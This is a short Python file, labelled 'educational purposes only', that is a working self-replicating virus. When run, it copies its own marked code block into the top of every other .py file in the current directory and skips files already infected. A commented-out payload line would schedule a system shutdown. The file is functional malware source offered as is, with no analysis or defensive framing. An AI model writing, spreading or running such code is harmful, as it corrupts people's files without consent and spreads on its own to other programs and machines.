####################################################
#                                                  #
# This file injects itself into other Python files #
#             Educational purposes only            #
#                                                  #
####################################################

# BEGIN VIRUS

import glob

def _virus():
    with open(__file__, 'r') as file:
        lines = file.readlines()
    a = lines.index("# BEGIN VIRUS\n")
    b = lines.index("# END VIRUS\n")
    return lines[a:b+1]

def inject(filename):
    with open(filename, 'r+') as file:
        lines = file.readlines()
        print(lines)
        if lines[0] == "# BEGIN VIRUS\n":
            return
        file.seek(0)
        for line in virus + lines:
            file.write(line)

virus = _virus()

for filename in glob.glob('*.py'):
    if __file__.endswith(filename):
        continue
    inject(filename)

# PAYLOAD

# __import__('os').system("shutdown +120")

# END VIRUS

print(''.join(virus))
